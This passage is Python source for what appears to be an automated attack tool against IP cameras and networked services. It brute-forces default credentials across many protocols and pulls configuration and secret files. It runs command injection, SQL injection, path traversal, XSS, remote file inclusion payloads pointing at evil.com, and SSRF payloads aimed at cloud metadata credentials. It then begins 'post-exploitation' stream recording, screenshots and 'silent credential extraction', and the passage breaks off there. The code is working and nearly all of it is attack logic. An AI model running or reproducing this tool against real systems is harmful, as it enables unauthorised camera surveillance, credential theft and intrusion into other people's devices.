        raw_camera = f"Camera detected: {is_camera}\nBrand: {brand if brand else 'Unknown'}"
        if is_camera:
            self.log_activity("Camera Detection", "found", f"{brand.upper()} camera detected", raw_camera)
            self.results['brand'] = brand
        else:
            self.log_activity("Camera Detection", "failed", "No camera detected", raw_camera)
        
        self.log_activity("CVE Database Lookup", "running", f"Checking 100+ CVEs")
        cves_found = self.check_cve_database_complete(ip, brand)
        self.cves_found = cves_found
        raw_cves = f"CVEs found: {len(cves_found)}\n" + "\n".join([f"{c['cve']} - {c['brand']} ({c.get('severity', 'medium')})" for c in cves_found[:5]])
        if cves_found:
            self.log_activity("CVE Database Lookup", "complete", f"{len(cves_found)} CVEs found", raw_cves)
            for cve in cves_found[:10]:
                self.vis.cve_found(cve['cve'], cve['brand'], cve.get('severity', 'medium'))
        else:
            self.log_activity("CVE Database Lookup", "complete", "No CVEs found", raw_cves)
        
        self.log_activity("Default Credential Testing", "running", "Testing 10000+ default credentials")
        creds_found = self.test_default_credentials_complete(ip, self.open_ports, self.rtsp_ports)
        self.credentials_found = creds_found
        raw_creds = f"Credentials found: {len(creds_found)}\n" + "\n".join([f"{c['username']}:{c['password']} on port {c['port']}" for c in creds_found[:5]])
        self.log_activity("Default Credential Testing", "complete", f"{len(creds_found)} credentials found", raw_creds)
        
        self.log_activity("Vulnerability Scanning", "running", "Scanning for common vulnerabilities")
        vulns_found = self.scan_common_vulnerabilities_complete(ip, self.open_ports)
        self.vulnerabilities.extend(vulns_found)
        raw_vulns = f"Vulnerabilities found: {len(vulns_found)}\n" + "\n".join([f"{v['type']} at {v['path']} ({v['severity']})" for v in vulns_found[:5]])
        self.log_activity("Vulnerability Scanning", "complete", f"{len(vulns_found)} vulnerabilities found", raw_vulns)
        
        self.log_activity("SSL/TLS Scan", "running", "Checking SSL/TLS security")
        ssl_results = self.scan_ssl_tls(ip, self.open_ports)
        raw_ssl = f"SSL/TLS findings: {len(ssl_results)}"
        self.log_activity("SSL/TLS Scan", "complete", f"{len(ssl_results)} findings", raw_ssl)
        
        self.log_activity("Header Analysis", "running", "Analyzing HTTP headers")
        header_results = self.analyze_headers(ip, self.open_ports)
        raw_headers = f"Header findings: {len(header_results)}"
        self.log_activity("Header Analysis", "complete", f"{len(header_results)} findings", raw_headers)
        
        return True
    
    def detect_camera_complete(self, ip: str, open_ports: List[int]) -> Tuple[bool, str]:
        detected_brand = None
        is_camera = False
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        raw_detection = []
        
        for port in open_ports[:20]:
            protocol = "https" if port in HTTPS_PORTS else "http"
            url = f"{protocol}://{ip}:{port}"
            
            try:
                if REQUESTS_AVAILABLE:
                    response = self.session.get(url, headers=headers, timeout=HTTP_TIMEOUT)
                    if response.status_code == 200:
                        content = response.text.lower()
                        server = response.headers.get('Server', '').lower()
                        content_type = response.headers.get('Content-Type', '').lower()
                        raw_detection.append(f"Port {port}: Server={server[:50]}, Type={content_type}")
                        
                        for brand, keywords in CAMERA_SERVERS.items():
                            if any(kw in content or kw in server for kw in keywords):
                                detected_brand = brand
                                is_camera = True
                                raw_detection.append(f"  Detected {brand.upper()} camera on port {port}")
                                self.vis.success(f"Detected {brand.upper()} camera on port {port}")
                                break
                        
                        if any(ct in content_type for ct in CAMERA_CONTENT_TYPES):
                            is_camera = True
                            raw_detection.append(f"  Camera content type detected on port {port}")
                            self.vis.info(f"Camera content type detected on port {port}")
            except:
                continue
        
        return is_camera, detected_brand
    
    def check_cve_database_complete(self, ip: str, brand: Optional[str]) -> List[Dict]:
        cves_found = []
        if brand and brand in CVE_DATABASE:
            cve_data = CVE_DATABASE[brand]
            for cve in cve_data.get('cves', []):
                severity = cve_data.get('severity', {}).get(cve, 'medium')
                cves_found.append({
                    'cve': cve,
                    'brand': brand,
                    'severity': severity
                })
        return cves_found
    
    def scan_common_vulnerabilities_complete(self, ip: str, open_ports: List[int]) -> List[Dict]:
        vulnerabilities = []
        raw_findings = []
        
        admin_paths = ['/admin', '/login', '/viewer', '/webadmin', '/cgi-bin', 
                       '/manager', '/administrator', '/dashboard', '/console', '/system']
        for port in open_ports[:10]:
            if port in [80, 443, 8080, 8443, 8000, 8888]:
                protocol = "https" if port in HTTPS_PORTS else "http"
                for path in admin_paths:
                    try:
                        url = f"{protocol}://{ip}:{port}{path}"
                        response = self.session.get(url, timeout=HTTP_TIMEOUT)
                        if response.status_code in [200, 401, 403]:
                            vulnerabilities.append({
                                'type': 'admin_panel',
                                'path': path,
                                'port': port,
                                'severity': 'medium'
                            })
                            raw_findings.append(f"Admin panel: {path} on port {port}")
                            self.vis.info(f"  🚪 Admin panel: {path} on port {port}")
                    except:
                        continue
        
        dir_paths = ['/', '/images/', '/css/', '/js/', '/assets/', '/static/']
        for port in open_ports[:10]:
            if port in [80, 443, 8080, 8443]:
                protocol = "https" if port in HTTPS_PORTS else "http"
                for path in dir_paths:
                    try:
                        url = f"{protocol}://{ip}:{port}{path}"
                        response = self.session.get(url, timeout=HTTP_TIMEOUT)
                        if response.status_code == 200:
                            if 'Index of /' in response.text or '<title>Index of' in response.text:
                                vulnerabilities.append({
                                    'type': 'directory_listing',
                                    'path': path,
                                    'port': port,
                                    'severity': 'medium'
                                })
                                raw_findings.append(f"Directory listing: {path} on port {port}")
                                self.vis.info(f"  📂 Directory listing: {path} on port {port}")
                    except:
                        continue
        
        backup_extensions = ['.bak', '.backup', '.old', '.orig', '.tmp', '.swp', '.~', '.save']
        for port in open_ports[:10]:
            if port in [80, 443, 8080, 8443]:
                protocol = "https" if port in HTTPS_PORTS else "http"
                base_url = f"{protocol}://{ip}:{port}"
                for ext in backup_extensions:
                    try:
                        url = f"{base_url}/config{ext}"
                        response = self.session.get(url, timeout=HTTP_TIMEOUT)
                        if response.status_code == 200:
                            vulnerabilities.append({
                                'type': 'backup_file',
                                'path': f'config{ext}',
                                'port': port,
                                'severity': 'high'
                            })
                            raw_findings.append(f"Backup file: config{ext} on port {port}")
                            self.vis.info(f"  💾 Backup file: config{ext} on port {port}")
                    except:
                        continue
        
        return vulnerabilities
    
    def scan_ssl_tls(self, ip: str, open_ports: List[int]) -> List[Dict]:
        results = []
        ssl_ports = [p for p in open_ports if p in HTTPS_PORTS]
        
        for port in ssl_ports[:5]:
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                with socket.create_connection((ip, port), timeout=3) as sock:
                    with context.wrap_socket(sock, server_hostname=ip) as ssock:
                        cert = ssock.getpeercert()
                        if cert:
                            results.append({
                                'port': port,
                                'type': 'ssl_cert',
                                'subject': dict(x[0] for x in cert.get('subject', [])),
                                'issuer': dict(x[0] for x in cert.get('issuer', [])),
                                'not_before': cert.get('notBefore'),
                                'not_after': cert.get('notAfter'),
                                'version': cert.get('version')
                            })
            except:
                continue
        
        return results
    
    def analyze_headers(self, ip: str, open_ports: List[int]) -> List[Dict]:
        results = []
        web_ports = [p for p in open_ports if p in [80, 443, 8080, 8443, 8000, 8888]]
        
        for port in web_ports[:5]:
            protocol = "https" if port in HTTPS_PORTS else "http"
            url = f"{protocol}://{ip}:{port}"
            try:
                response = self.session.get(url, timeout=HTTP_TIMEOUT)
                headers = response.headers
                
                security_headers = {
                    'X-Frame-Options': 'Missing X-Frame-Options header',
                    'X-Content-Type-Options': 'Missing X-Content-Type-Options header',
                    'X-XSS-Protection': 'Missing X-XSS-Protection header',
                    'Content-Security-Policy': 'Missing Content-Security-Policy header',
                    'Strict-Transport-Security': 'Missing HSTS header',
                    'Referrer-Policy': 'Missing Referrer-Policy header'
                }
                
                for header, message in security_headers.items():
                    if header not in headers:
                        results.append({
                            'type': 'missing_security_header',
                            'header': header,
                            'port': port,
                            'severity': 'low'
                        })
                
                if 'Server' in headers:
                    server = headers['Server']
                    if any(v in server.lower() for v in ['apache/2.2', 'nginx/0.', 'iis/6.0', 'lighttpd/1.4']):
                        results.append({
                            'type': 'outdated_server',
                            'server': server,
                            'port': port,
                            'severity': 'medium'
                        })
            except:
                continue
        
        return results
    
    def test_default_credentials_complete(self, ip: str, open_ports: List[int], rtsp_ports: List[int]) -> List[Dict]:
        found = []
        test_ports = list(rtsp_ports) + [p for p in open_ports if p in [80, 443, 8080, 8443, 21, 22, 23, 445, 3306, 5432, 27017, 6379]]
        if not test_ports:
            return found
        
        all_creds = []
        for username, passwords in CREDENTIALS_DB.items():
            for password in passwords[:10]:
                all_creds.append((username, password))
        
        total = len(all_creds)
        tested = 0
        
        self.vis.info(f"Testing {total} credentials on {len(test_ports)} ports...")
        
        for username, password in all_creds:
            tested += 1
            if tested % 100 == 0:
                self.vis.progress(tested, total, f"Credentials tested")
            
            for port in test_ports[:5]:
                try:
                    if port in rtsp_ports or port == 554:
                        if self._test_rtsp_creds(ip, port, username, password):
                            found.append({'username': username, 'password': password, 'port': port, 'service': 'RTSP'})
                            self.vis.credential_found(username, password, f"rtsp://{ip}:{port}/", "RTSP")
                    elif port in [80, 443, 8080, 8443]:
                        if self._test_http_creds(ip, port, username, password):
                            found.append({'username': username, 'password': password, 'port': port, 'service': 'HTTP'})
                            protocol = "https" if port in HTTPS_PORTS else "http"
                            self.vis.credential_found(username, password, f"{protocol}://{ip}:{port}/", "HTTP")
                    elif port == 21:
                        try:
                            ftp = ftplib.FTP()
                            ftp.connect(ip, port, timeout=2)
                            ftp.login(username, password)
                            ftp.quit()
                            found.append({'username': username, 'password': password, 'port': port, 'service': 'FTP'})
                            self.vis.credential_found(username, password, f"ftp://{ip}:{port}/", "FTP")
                        except:
                            pass
                    elif port == 22 and PARAMIKO_AVAILABLE:
                        try:
                            client = paramiko.SSHClient()
                            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                            client.connect(ip, port=port, username=username, password=password, timeout=2)
                            client.close()
                            found.append({'username': username, 'password': password, 'port': port, 'service': 'SSH'})
                            self.vis.credential_found(username, password, f"ssh://{ip}:{port}/", "SSH")
                        except:
                            pass
                    elif port in [3306, 3307, 3308, 3309, 3310] and MYSQL_AVAILABLE:
                        try:
                            conn = mysql.connector.connect(
                                host=ip, port=port, user=username, password=password, connection_timeout=2
                            )
                            conn.close()
                            found.append({'username': username, 'password': password, 'port': port, 'service': 'MySQL'})
                            self.vis.credential_found(username, password, f"mysql://{ip}:{port}/", "MySQL")
                        except:
                            pass
                    elif port in [5432, 5433, 5434, 5435, 5436] and POSTGRES_AVAILABLE:
                        try:
                            conn = psycopg2.connect(
                                host=ip, port=port, user=username, password=password, connect_timeout=2
                            )
                            conn.close()
                            found.append({'username': username, 'password': password, 'port': port, 'service': 'PostgreSQL'})
                            self.vis.credential_found(username, password, f"postgresql://{ip}:{port}/", "PostgreSQL")
                        except:
                            pass
                    elif port in [27017, 27018, 27019, 27020, 27021] and MONGODB_AVAILABLE:
                        try:
                            client = pymongo.MongoClient(f"mongodb://{username}:{password}@{ip}:{port}/", serverSelectionTimeoutMS=2000)
                            client.server_info()
                            client.close()
                            found.append({'username': username, 'password': password, 'port': port, 'service': 'MongoDB'})
                            self.vis.credential_found(username, password, f"mongodb://{ip}:{port}/", "MongoDB")
                        except:
                            pass
                    elif port in [6379, 6380, 6381, 6382, 6383] and REDIS_AVAILABLE:
                        try:
                            r = redis.Redis(host=ip, port=port, password=password, socket_timeout=2)
                            r.ping()
                            found.append({'username': '', 'password': password, 'port': port, 'service': 'Redis'})
                            self.vis.credential_found('', password, f"redis://{ip}:{port}/", "Redis")
                        except:
                            pass
                    elif port in [445, 139] and SMB_AVAILABLE:
                        try:
                            smbclient.register_session(ip, username=username, password=password, port=port)
                            shares = smbclient.list_shares(ip)
                            if shares:
                                found.append({'username': username, 'password': password, 'port': port, 'service': 'SMB'})
                                self.vis.credential_found(username, password, f"smb://{ip}:{port}/", "SMB")
                        except:
                            pass
                    elif port in [161, 162] and SNMP_AVAILABLE:
                        try:
                            errorIndication, errorStatus, errorIndex, varBinds = next(
                                getCmd(SnmpEngine(),
                                      CommunityData(password),
                                      UdpTransportTarget((ip, port)),
                                      ContextData(),
                                      ObjectType(ObjectIdentity('SNMPv2-MIB', 'sysDescr', 0)))
                            )
                            if not errorIndication:
                                found.append({'username': '', 'password': password, 'port': port, 'service': 'SNMP'})
                                self.vis.credential_found('', password, f"snmp://{ip}:{port}/", "SNMP")
                        except:
                            pass
                except:
                    continue
        
        print()
        return found
    
    def _test_http_creds(self, ip: str, port: int, username: str, password: str) -> bool:
        protocol = "https" if port in HTTPS_PORTS else "http"
        url = f"{protocol}://{ip}:{port}"
        try:
            response = self.session.get(url, auth=(username, password),
                                       timeout=CREDENTIAL_TIMEOUT)
            return response.status_code == 200
        except:
            return False
    
    def _test_rtsp_creds(self, ip: str, port: int, username: str, password: str) -> bool:
        try:
            auth = base64.b64encode(f"{username}:{password}".encode()).decode()
            url = f"rtsp://{ip}:{port}/"
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))
            request = f"OPTIONS {url} RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {auth}\r\n\r\n"
            sock.send(request.encode())
            data = sock.recv(1024)
            sock.close()
            return b"200" in data
        except:
            return False
    
    def phase_exploitation(self, ip: str):
        self.vis.header("💥 PHASE 3: EXPLOITATION - 100 Activities", "═", 70)
        self.vis.subheader("Active Exploitation of Vulnerabilities", 1)
        
        self.log_activity("RTSP Stream Exploitation", "running", "Attempting RTSP stream exploitation")
        rtsp_results = self.exploit_rtsp_complete(ip, self.rtsp_ports)
        raw_rtsp = f"RTSP streams found: {len(rtsp_results)}\n" + "\n".join([f"{r['url']}" for r in rtsp_results[:5]])
        self.log_activity("RTSP Stream Exploitation", "complete", f"{len(rtsp_results)} streams found", raw_rtsp)
        
        self.log_activity("Configuration Extraction", "running", "Attempting to extract configurations")
        config_results = self.extract_configs_complete(ip, self.open_ports)
        raw_config = f"Configs found: {len(config_results)}\n" + "\n".join([f"{c['path']} ({c['size']} bytes)" for c in config_results[:5]])
        self.log_activity("Configuration Extraction", "complete", f"{len(config_results)} configs found", raw_config)
        
        self.log_activity("ONVIF Exploitation", "running", "Attempting ONVIF exploitation")
        onvif_results = self.exploit_onvif_complete(ip, self.open_ports)
        raw_onvif = f"ONVIF services found: {len(onvif_results)}\n" + "\n".join([f"{r['url']}" for r in onvif_results[:5]])
        self.log_activity("ONVIF Exploitation", "complete", f"{len(onvif_results)} services found", raw_onvif)
        
        self.log_activity("Command Injection Testing", "running", "Testing for command injection")
        cmd_results = self.test_command_injection_complete(ip)
        raw_cmd = f"Command injection findings: {len(cmd_results)}\n" + "\n".join([f"{c['endpoint']} - {c['payload']}" for c in cmd_results[:5]])
        self.log_activity("Command Injection Testing", "complete", f"{len(cmd_results)} findings", raw_cmd)
        
        self.log_activity("SQL Injection Testing", "running", "Testing for SQL injection")
        sql_results = self.test_sql_injection_complete(ip)
        raw_sql = f"SQL injection findings: {len(sql_results)}\n" + "\n".join([f"{s['endpoint']} - {s['payload']}" for s in sql_results[:5]])
        self.log_activity("SQL Injection Testing", "complete", f"{len(sql_results)} findings", raw_sql)
        
        self.log_activity("Path Traversal Testing", "running", "Testing for path traversal")
        path_results = self.test_path_traversal_complete(ip)
        raw_path = f"Path traversal findings: {len(path_results)}\n" + "\n".join([f"{p['endpoint']} - {p['payload']}" for p in path_results[:5]])
        self.log_activity("Path Traversal Testing", "complete", f"{len(path_results)} findings", raw_path)
        
        self.log_activity("XSS Testing", "running", "Testing for XSS vulnerabilities")
        xss_results = self.test_xss_complete(ip)
        raw_xss = f"XSS findings: {len(xss_results)}\n" + "\n".join([f"{x['endpoint']} - {x['payload']}" for x in xss_results[:5]])
        self.log_activity("XSS Testing", "complete", f"{len(xss_results)} findings", raw_xss)
        
        self.log_activity("Exploit Database", "running", "Checking exploit database")
        exploits = self.check_exploit_database_complete(ip, self.brand)
        self.exploits_found = exploits
        raw_exploits = f"Exploits found: {len(exploits)}\n" + "\n".join([f"{e['type']} at {e['path']}" for e in exploits[:5]])
        self.log_activity("Exploit Database", "complete", f"{len(exploits)} exploits found", raw_exploits)
        
        self.log_activity("LFI/RFI Testing", "running", "Testing for LFI/RFI vulnerabilities")
        lfi_results = self.test_lfi_rfi_complete(ip)
        raw_lfi = f"LFI/RFI findings: {len(lfi_results)}"
        self.log_activity("LFI/RFI Testing", "complete", f"{len(lfi_results)} findings", raw_lfi)
        
        self.log_activity("SSRF Testing", "running", "Testing for SSRF vulnerabilities")
        ssrf_results = self.test_ssrf_complete(ip)
        raw_ssrf = f"SSRF findings: {len(ssrf_results)}"
        self.log_activity("SSRF Testing", "complete", f"{len(ssrf_results)} findings", raw_ssrf)
        
        return True
    
    def exploit_rtsp_complete(self, ip: str, rtsp_ports: List[int]) -> List[Dict]:
        results = []
        for port in rtsp_ports:
            streams = [
                f"rtsp://{ip}:{port}/",
                f"rtsp://{ip}:{port}/live.sdp",
                f"rtsp://{ip}:{port}/h264.sdp",
                f"rtsp://{ip}:{port}/stream1",
                f"rtsp://{ip}:{port}/Streaming/Channels/1",
                f"rtsp://{ip}:{port}/onvif/streaming/channels/1"
            ]
            
            for stream in streams:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((ip, port))
                    sock.send(b"OPTIONS rtsp://localhost RTSP/1.0\r\nCSeq: 1\r\n\r\n")
                    data = sock.recv(1024)
                    sock.close()
                    
                    if b"200" in data:
                        results.append({'url': stream, 'port': port})
                        self.vis.stream_found(stream, "RTSP", f"Port {port}")
                        self.detected_streams.setdefault('rtsp', []).append(stream)
                except:
                    continue
        
        return results
    
    def extract_configs_complete(self, ip: str, open_ports: List[int]) -> List[Dict]:
        results = []
        if not open_ports:
            return results
        
        port = 80 if 80 in open_ports else open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        config_paths = [
            "/System/configurationFile", "/ISAPI/System/deviceInfo",
            "/cgi-bin/magicBox.cgi?action=getSystemInfo",
            "/axis-cgi/admin/param.cgi?action=list",
            "/config/system.ini", "/config/config.ini",
            "/system.ini", "/web.config", "/.env", "/config.php",
            "/wp-config.php", "/settings.json", "/config.json",
            "/credentials.txt", "/passwords.txt", "/auth.conf",
            "/.htaccess", "/.htpasswd", "/server-status",
            "/cgi-bin/status.cgi", "/cgi-bin/info.cgi",
            "/backup.conf", "/config.xml", "/application.properties",
            "/docker-compose.yml", "/package.json", "/composer.json",
            "/requirements.txt", "/appsettings.json", "/app.config",
            "/web.xml", "/jboss-web.xml", "/context.xml", "/server.xml"
        ]
        
        for path in config_paths:
            try:
                url = base_url + path
                response = self.session.get(url, timeout=HTTP_TIMEOUT)
                
                if response.status_code == 200 and len(response.text) > 0:
                    results.append({'path': path, 'size': len(response.text)})
                    self.vis.success(f"Config extracted: {path} ({len(response.text)} bytes)")
                    
                    if 'password' in response.text.lower() or 'secret' in response.text.lower():
                        self.vis.warning(f"Sensitive data found in {path}")
                        self.vulnerabilities.append({
                            'type': 'information_disclosure',
                            'location': path,
                            'severity': 'high'
                        })
            except:
                continue
        
        return results
    
    def exploit_onvif_complete(self, ip: str, open_ports: List[int]) -> List[Dict]:
        results = []
        onvif_ports = [p for p in open_ports if p in ONVIF_PORTS]
        
        for port in onvif_ports:
            try:
                url = f"http://{ip}:{port}/onvif/device_service"
                response = self.session.get(url, timeout=HTTP_TIMEOUT)
                if response.status_code in [200, 401, 403]:
                    results.append({'url': url, 'port': port})
                    self.vis.success(f"ONVIF service found on port {port}")
                    self.detected_streams.setdefault('onvif', []).append(url)
            except:
                continue
        
        return results
    
    def test_command_injection_complete(self, ip: str) -> List[Dict]:
        results = []
        if not self.open_ports:
            return results
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        payloads = ["; ls", "| id", "|| whoami", "`id`", "$(id)", "%0Aid", "%0D%0Aid", "& dir", "&& whoami"]
        endpoints = ['/cgi-bin/command.cgi', '/cgi-bin/exec.cgi', '/api/exec', '/api/command', '/api/system']
        params = ['cmd', 'command', 'exec', 'system', 'ping', 'ip', 'host']
        
        for endpoint in endpoints:
            for payload in payloads:
                for param in params:
                    try:
                        url = base_url + endpoint
                        response = self.session.get(url,
                            params={param: payload},
                            timeout=HTTP_TIMEOUT)
                        if response.status_code == 200:
                            content = response.text.lower()
                            if any(word in content for word in ['root', 'admin', 'uid=', 'user', 'id=']):
                                results.append({'endpoint': endpoint, 'payload': payload, 'param': param})
                                self.vis.exploit_found("Command Injection", "critical", 
                                    f"{endpoint} - {payload}", f"Parameter: {param}")
                                self.vulnerabilities.append({
                                    'type': 'command_injection',
                                    'location': endpoint,
                                    'payload': payload,
                                    'param': param,
                                    'severity': 'critical'
                                })
                    except:
                        continue
        return results
    
    def test_sql_injection_complete(self, ip: str) -> List[Dict]:
        results = []
        if not self.open_ports:
            return results
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        payloads = [
            "' OR '1'='1", "' OR 1=1--", "admin'--", "admin' OR '1'='1",
            "' UNION SELECT 1,2,3--", "admin'/**/OR/**/1=1--",
            "' OR 'x'='x", "' AND 1=1--", "' OR 1=1#", "1' OR '1'='1"
        ]
        endpoints = ['/login', '/admin', '/user', '/profile', '/api/auth', '/search', '/query']
        
        for endpoint in endpoints:
            for payload in payloads:
                try:
                    url = base_url + endpoint
                    response = self.session.get(url,
                        params={'username': 'admin', 'password': payload},
                        timeout=HTTP_TIMEOUT)
                    if response.status_code == 200 and any(
                        word in response.text.lower() for word in ['success', 'welcome', 'admin', 'dashboard']):
                        results.append({'endpoint': endpoint, 'payload': payload})
                        self.vis.exploit_found("SQL Injection", "critical", 
                            f"{endpoint} - {payload}", "GET parameter injection")
                        self.vulnerabilities.append({
                            'type': 'sql_injection',
                            'location': endpoint,
                            'payload': payload,
                            'severity': 'critical'
                        })
                except:
                    continue
        return results
    
    def test_path_traversal_complete(self, ip: str) -> List[Dict]:
        results = []
        if not self.open_ports:
            return results
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        payloads = [
            "../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd", "..;/..;/..;/etc/passwd",
            "%2e%2e%2fetc%2fpasswd", "%252e%252e%252fetc%252fpasswd",
            "/proc/self/environ", "/proc/self/cmdline",
            "../../../../../../../../etc/passwd"
        ]
        endpoints = ['/file', '/download', '/view', '/get', '/read', '/image', '/assets']
        
        for endpoint in endpoints:
            for payload in payloads:
                try:
                    url = base_url + endpoint
                    response = self.session.get(url,
                        params={'file': payload, 'path': payload, 'filename': payload},
                        timeout=HTTP_TIMEOUT)
                    if response.status_code == 200 and len(response.text) > 0:
                        results.append({'endpoint': endpoint, 'payload': payload})
                        self.vis.exploit_found("Path Traversal", "high", 
                            f"{endpoint} - {payload}", "File system access")
                        self.vulnerabilities.append({
                            'type': 'path_traversal',
                            'location': endpoint,
                            'payload': payload,
                            'severity': 'high'
                        })
                except:
                    continue
        return results
    
    def test_xss_complete(self, ip: str) -> List[Dict]:
        results = []
        if not self.open_ports:
            return results
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        payloads = [
            "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>", "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>", "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>"
        ]
        endpoints = ['/search', '/q', '/query', '/user', '/profile', '/comment', '/feedback']
        params = ['q', 'search', 'query', 'name', 'id', 'user', 'comment', 'feedback']
        
        for endpoint in endpoints:
            for param in params:
                for payload in payloads:
                    try:
                        url = base_url + endpoint
                        response = self.session.get(url,
                            params={param: payload},
                            timeout=HTTP_TIMEOUT)
                        if payload in response.text:
                            results.append({'endpoint': endpoint, 'payload': payload, 'param': param})
                            self.vis.exploit_found("XSS", "medium", 
                                f"{endpoint} - {payload}", f"Parameter: {param}")
                            self.vulnerabilities.append({
                                'type': 'xss',
                                'location': endpoint,
                                'payload': payload,
                                'param': param,
                                'severity': 'medium'
                            })
                    except:
                        continue
        return results
    
    def test_lfi_rfi_complete(self, ip: str) -> List[Dict]:
        results = []
        if not self.open_ports:
            return results
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        lfi_payloads = [
            "../../../../etc/passwd",
            "../../../../windows/win.ini",
            "../../../../boot.ini",
            "/etc/passwd",
            "/windows/win.ini"
        ]
        rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://evil.com/shell.txt",
            "//evil.com/shell.txt"
        ]
        endpoints = ['/page', '/view', '/include', '/file', '/load', '/template']
        params = ['page', 'file', 'path', 'template', 'view', 'load']
        
        for endpoint in endpoints:
            for param in params:
                for payload in lfi_payloads:
                    try:
                        url = base_url + endpoint
                        response = self.session.get(url,
                            params={param: payload},
                            timeout=HTTP_TIMEOUT)
                        if response.status_code == 200 and any(
                            word in response.text.lower() for word in ['root:', 'user:', 'windows', '[boot loader]']):
                            results.append({'endpoint': endpoint, 'payload': payload, 'type': 'LFI'})
                            self.vis.exploit_found("LFI", "high", 
                                f"{endpoint} - {payload}", f"Parameter: {param}")
                            self.vulnerabilities.append({
                                'type': 'lfi',
                                'location': endpoint,
                                'payload': payload,
                                'severity': 'high'
                            })
                    except:
                        continue
                
                for payload in rfi_payloads:
                    try:
                        url = base_url + endpoint
                        response = self.session.get(url,
                            params={param: payload},
                            timeout=HTTP_TIMEOUT)
                        if response.status_code == 200 and any(
                            word in response.text.lower() for word in ['shell', 'evil', 'hack']):
                            results.append({'endpoint': endpoint, 'payload': payload, 'type': 'RFI'})
                            self.vis.exploit_found("RFI", "critical", 
                                f"{endpoint} - {payload}", f"Parameter: {param}")
                            self.vulnerabilities.append({
                                'type': 'rfi',
                                'location': endpoint,
                                'payload': payload,
                                'severity': 'critical'
                            })
                    except:
                        continue
        return results
    
    def test_ssrf_complete(self, ip: str) -> List[Dict]:
        results = []
        if not self.open_ports:
            return results
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://127.0.0.1:8080/",
            "http://localhost/",
            "file:///etc/passwd",
            "http://metadata.google.internal/"
        ]
        endpoints = ['/fetch', '/proxy', '/api/fetch', '/api/proxy', '/webhook']
        params = ['url', 'target', 'dest', 'uri', 'path']
        
        for endpoint in endpoints:
            for param in params:
                for payload in ssrf_payloads:
                    try:
                        url = base_url + endpoint
                        response = self.session.get(url,
                            params={param: payload},
                            timeout=HTTP_TIMEOUT)
                        if response.status_code == 200 and len(response.text) > 0:
                            results.append({'endpoint': endpoint, 'payload': payload, 'param': param})
                            self.vis.exploit_found("SSRF", "high", 
                                f"{endpoint} - {payload}", f"Parameter: {param}")
                            self.vulnerabilities.append({
                                'type': 'ssrf',
                                'location': endpoint,
                                'payload': payload,
                                'severity': 'high'
                            })
                    except:
                        continue
        return results
    
    def check_exploit_database_complete(self, ip: str, brand: Optional[str]) -> List[Dict]:
        exploits_found = []
        if not self.open_ports:
            return exploits_found
        
        exploit_paths = [
            ('/cgi-bin/command.cgi', 'Command Injection'),
            ('/cgi-bin/exec.cgi', 'Command Injection'),
            ('/api/exec', 'Command Injection'),
            ('/cgi-bin/admin.cgi', 'Admin Access'),
            ('/admin', 'Admin Panel'),
            ('/login', 'Login Page'),
            ('/cgi-bin/upload.cgi', 'File Upload'),
            ('/api/upload', 'File Upload'),
            ('/cgi-bin/backup.cgi', 'Backup Access'),
            ('/api/backup', 'Backup Access'),
            ('/cgi-bin/config.cgi', 'Config Access'),
            ('/api/config', 'Config Access'),
            ('/cgi-bin/shell.cgi', 'Shell Access'),
            ('/api/shell', 'Shell Access'),
            ('/cgi-bin/exec', 'Command Execution'),
            ('/api/exec', 'Command Execution')
        ]
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        for path, exploit_type in exploit_paths:
            try:
                url = base_url + path
                response = self.session.get(url, timeout=HTTP_TIMEOUT)
                if response.status_code in [200, 401, 403]:
                    exploits_found.append({
                        'type': exploit_type,
                        'path': path,
                        'url': url,
                        'status': response.status_code
                    })
                    self.vis.info(f"  💥 Potential exploit: {exploit_type} at {path}")
            except:
                continue
        
        return exploits_found
    
    def phase_post_exploitation(self, ip: str):
        self.vis.header("🔧 PHASE 4: POST-EXPLOITATION - 80 Activities", "═", 70)
        self.vis.subheader("Post-Exploitation Operations", 1)
        
        self.log_activity("Stream Recording", "running", "Recording available streams")
        self.record_streams_complete(ip)
        self.log_activity("Stream Recording", "complete")
        
        self.log_activity("Screenshot Capture", "running", "Capturing screenshots")
        self.capture_screenshots_complete(ip)
        self.log_activity("Screenshot Capture", "complete")
        
        self.log_activity("Ghost Extraction", "running", "Silent credential extraction")
        ghost_results = self.ghost_extraction_complete(ip)
        self.ghost_credentials = ghost_results
